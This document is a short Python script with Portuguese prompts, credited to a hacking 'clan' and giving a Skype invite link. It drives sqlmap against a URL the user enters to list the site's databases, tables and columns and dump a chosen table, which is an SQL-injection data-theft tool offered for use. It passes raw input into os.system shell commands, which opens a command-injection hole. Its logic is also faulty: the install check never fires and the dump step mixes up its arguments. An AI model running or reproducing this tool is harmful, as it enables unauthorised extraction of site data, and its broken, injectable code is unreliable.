import os
b=str(input('PARA RODAR ESTA APLICAÇAO E PRECISO ESTALAR O SQLMAP, VC DESEJA ESTALAR AGORA(SIM=1 NAO=2):'))
if(b==1):
    os.system('sudo apt install sqlmap')
else:
    print('FEITO PELO PDL DO CLAN FALIDO CLAY(SKYPE=https://join.skype.com/invite/JZDH6UDIyDK9)')
    site=str(input('digite a URL do site:'))
    os.system('sqlmap -u {} --dbs'.format(site))
    a=int(input('deseja continuar (sim=1 nao=2):'))
    if(a==1):
        site2=str(input('coleque aqui suas tabelas:'))
        os.system('sqlmap -u {} -D {} --tables'.format(site,site2))
        site3=str(input('digiti aqui suas colunas:'))
        os.system('sqlmap -u {} -D {} -T {} --columns'.format(site,site2,site3))
        site4=str(input('digit oque vc quer obiter:'))
        os.system('sqlmap -u {} -D {} -T users -C {} --dump'.format(site,site2,site3,site4))
    else:
        print('falou mano!!!')
        print('FEITO PELO PDL DO CLAN FALIDO CLAY(SKYPE=https://join.skype.com/invite/JZDH6UDIyDK9)')
